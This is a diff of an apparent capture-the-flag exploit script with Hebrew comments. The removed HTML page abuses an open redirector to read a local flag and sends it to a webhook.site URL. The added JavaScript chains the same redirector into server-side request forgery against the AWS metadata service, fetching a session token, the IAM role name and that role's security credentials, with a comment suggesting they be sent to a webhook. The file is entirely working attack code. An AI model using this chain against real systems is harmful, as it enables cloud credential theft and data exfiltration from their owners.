@@ -1,28 +1,34 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>CTF CORS Redirector Exploit</title>
-</head>
-<body>
-  <h1>Running CORS Redirector Exploit...</h1>
-  <script>
-    // כתובת ה-redirector + ה-URL של הדגל שאת רוצה לגשת אליו
-    const redirectorUrl = '/redir.php?url=' + encodeURIComponent('http://127.0.0.1/flag');
+const imdsTokenUrl = 'http://169.254.169.254/latest/api/token';
+const redirectorUrl = '/redir.php?url=' + encodeURIComponent(imdsTokenUrl);
 
-    fetch(redirectorUrl)
-      .then(response => response.text())
-      .then(flagText => {
-        // שולח את הדגל שנמצא ל-webhook.site שלך
-        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?flag=' + encodeURIComponent(flagText);
+fetch(redirectorUrl, {
+  method: 'PUT',
+  headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' }
+})
+.then(res => res.text())
+.then(token => {
+  // המשך בקשות עם הטוקן
+  const iamUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
+  const iamRedirect = '/redir.php?url=' + encodeURIComponent(iamUrl);
 
-        // גם מציג בדף שלך כדי לוודא שזה רץ
-        document.body.insertAdjacentHTML('beforeend', '<pre style="color:green;">' + flagText + '</pre>');
-      })
-      .catch(error => {
-        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?error=' + encodeURIComponent(error.toString());
-        document.body.insertAdjacentHTML('beforeend', '<p style="color:red;">Error: ' + error + '</p>');
-      });
-  </script>
-</body>
-</html>
+  return fetch(iamRedirect, {
+    headers: { 'X-aws-ec2-metadata-token': token }
+  })
+  .then(res => res.text())
+  .then(role => {
+    const credsUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role;
+    const credsRedirect = '/redir.php?url=' + encodeURIComponent(credsUrl);
+
+    return fetch(credsRedirect, {
+      headers: { 'X-aws-ec2-metadata-token': token }
+    });
+  });
+})
+.then(res => res.text())
+.then(creds => {
+  console.log('Got credentials:', creds);
+  // שלחי ל-webhook או הדפיסי בדף
+})
+.catch(err => {
+  console.error('Error:', err);
+});
